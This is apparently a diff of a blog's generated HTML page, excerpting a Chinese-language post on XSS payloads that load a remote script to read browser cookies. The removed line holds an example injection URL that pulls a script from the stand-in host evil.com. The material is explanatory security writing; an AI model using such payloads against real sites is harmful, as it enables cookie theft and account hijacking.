@@ -772,8 +772,7 @@
       
         
           <p>XSS Payload实际上就是javascript脚本（也可以是其他富客户端脚本）</p>
-<h3 id="加载远程脚本-常见"><a href="#加载远程脚本-常见" class="headerlink" title="加载远程脚本(常见)"></a>加载远程脚本(常见)</h3><h4 id="XSS-获取浏览器-Cookie对象"><a href="#XSS-获取浏览器-Cookie对象" class="headerlink" title="XSS 获取浏览器 Cookie对象"></a>XSS 获取浏览器 Cookie对象</h4><p>攻击者先加载一个远程脚本js</p>
-<p><code>http://www.a.com/test.htm?abc=&quot;&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</code><br>真正的XSS Payload写在这个远程脚本中，避免在URL的参数里写入大量的JavaScript代码<br>
+<h3 id="加载远程脚本-常见"><a href="#加载远程脚本-常见" class="headerlink" title="加载远程脚本(常见)"></a>加载远程脚本(常见)</h3><h4 id="XSS-获取浏览器-Cookie对象"><a href="#XSS-获取浏览器-Cookie对象" class="headerlink" title="XSS 获取浏览器 Cookie对象"></a>XSS 获取浏览器 Cookie对象</h4><p>攻击者先加载一个远程脚本js<br>
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2017/07/24/xss所加载的脚本/#more" rel="contents">
